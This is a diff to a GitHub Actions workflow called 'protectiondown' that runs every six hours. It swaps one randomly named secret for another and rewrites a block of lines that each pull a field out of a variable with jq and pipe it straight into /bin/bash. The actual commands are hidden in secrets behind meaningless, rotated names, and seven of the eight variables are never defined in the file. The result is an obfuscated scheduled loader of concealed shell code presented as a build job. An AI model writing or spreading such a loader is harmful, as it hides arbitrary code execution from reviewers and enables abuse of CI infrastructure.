@@ -3,9 +3,9 @@ name: protectiondown
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 3/6 * * *'
+    - cron: '37 5/6 * * *'
 
-jobs:  # 18860
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,15 +13,14 @@ jobs:  # 18860
       - uses: actions/checkout@v4
       - name: protectiondown
         env:
-          gc70610: ${{ secrets.gc70610 }}
+          bcfj92810: ${{ secrets.bcfj92810 }}
         run: |
-          echo $gc70610 | jq -r .n00 | /bin/bash
-          echo $bbno4 | jq -r .ke0708 | /bin/bash
-          echo $djzoh3 | jq -r .l75572 | /bin/bash
-          echo $uqx610 | jq -r .g92 | /bin/bash
-          echo $izj4911 | jq -r .qydy3 | /bin/bash
-          echo $ll7205 | jq -r .x01 | /bin/bash
-          echo $skrzw28733 | jq -r .z9510 | /bin/bash
-          echo $tkfqo6 | jq -r .uz52 | /bin/bash
-          echo $wrog51 | jq -r .ccv284 | /bin/bash
+          echo $bcfj92810 | jq -r .fvpu6 | /bin/bash
+          echo $nnbxs11743 | jq -r .nwyf555 | /bin/bash
+          echo $yhsh60 | jq -r .fxkv1 | /bin/bash
+          echo $ukpc96 | jq -r .bdw4 | /bin/bash
+          echo $zbw9 | jq -r .qeftl4 | /bin/bash
+          echo $ynsc014 | jq -r .ecrmd7867 | /bin/bash
+          echo $lwxy99021 | jq -r .in04 | /bin/bash
+          echo $yrox0 | jq -r .xh89568 | /bin/bash
 
